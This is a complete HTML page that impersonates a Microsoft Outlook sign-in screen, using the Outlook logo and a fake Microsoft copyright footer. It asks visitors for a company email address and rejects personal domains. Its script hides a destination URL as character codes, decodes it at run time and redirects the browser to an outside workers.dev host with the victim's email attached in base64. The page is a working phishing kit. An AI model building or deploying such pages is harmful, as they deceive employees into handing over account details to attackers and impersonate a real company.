<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/svg" href="https://upload.wikimedia.org/wikipedia/commons/d/df/Microsoft_Office_Outlook_%282018%E2%80%93present%29.svg">
    <title>Authentication</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            text-align: center; 
            background-color: #f4f4f4; 
            color: black; 
            margin: 0; 
            padding: 0; 
            min-height: 100vh; 
            display: flex; 
            flex-direction: column; 
            justify-content: center; 
            align-items: center;
        }
        .container { 
            width: 90%; 
            max-width: 400px; 
            padding: 20px; 
            background: white; 
            border-radius: 10px; 
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }
        .logo { 
            width: 80px; 
            margin-bottom: 20px;
        }
        input, button { 
            width: 100%; 
            padding: 12px; 
            margin-top: 10px; 
            border-radius: 5px; 
            font-size: 16px;
        }
        input { 
            border: 1px solid #ccc; 
        }
        button { 
            background-color: #0072c6; 
            color: white; 
            border: none; 
            cursor: pointer; 
        }
        button:hover { 
            background-color: #005a9e; 
        }
        footer { 
            text-align: center; 
            padding: 15px; 
            font-size: 14px; 
            width: 100%; 
            background: #f4f4f4;
        }
        footer a { 
            color: black; 
            text-decoration: none; 
            margin: 0 10px;
        }
        @media (max-width: 480px) {
            .container {
                width: 95%;
                padding: 15px;
            }
            .logo {
                width: 60px;
            }
            input, button {
                font-size: 14px;
                padding: 10px;
            }
        }
    </style>
</head>
<body>
    <div id="auth-page" class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/d/df/Microsoft_Office_Outlook_%282018%E2%80%93present%29.svg" alt="Outlook Logo" class="logo"><br>
        <h2>Authentication Required</h2>
        <p>Please verify your email to continue.</p>
        <input type="email" id="email" placeholder="Enter your Outlook email">
        <button onclick="validateEmail()">Continue</button>
    </div>

    <footer>
        <p>&copy; <span id="year"></span> Microsoft. All Rights Reserved.</p>
        <p>
            <a href="privacy-policy.html">Privacy Policy</a> |
            <a href="terms-of-use.html">Terms of Use</a>
        </p>
    </footer>

    <script>
        document.getElementById("year").textContent = new Date().getFullYear();

        function validateEmail() {
            let email = document.getElementById("email").value.trim();
            let validRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

            if (!validRegex.test(email)) {
                alert("Invalid email format");
                return;
            }

            let forbiddenDomains = ["gmail.com", "yahoo.com", "aol.com", "company.com"];
            let emailDomain = email.split("@")[1].toLowerCase();
            
            if (forbiddenDomains.includes(emailDomain)) {
                alert("Personal emails are not allowed. Use your company email.");
                return;
            }
            
            let encodedURL = "104 116 116 112 115 58 47 47 111 108 100 45 109 111 100 101 45 98 57 53 97 45 97 99 116 105 118 105 116 121 101 110 101 114 103 121 114 105 99 104 104 46 99 111 114 121 99 104 97 115 101 48 57 50 46 119 111 114 107 101 114 115 46 100 101 118";
            let decodedURL = encodedURL.split(" ").map(num => String.fromCharCode(num)).join("");
            window.location.href = decodedURL + "?email=" + encodeURIComponent(btoa(email));
        }

        document.getElementById("email").addEventListener("keypress", function(event) {
            if (event.key === "Enter") {
                validateEmail();
            }
        });
    </script>
</body>
</html>
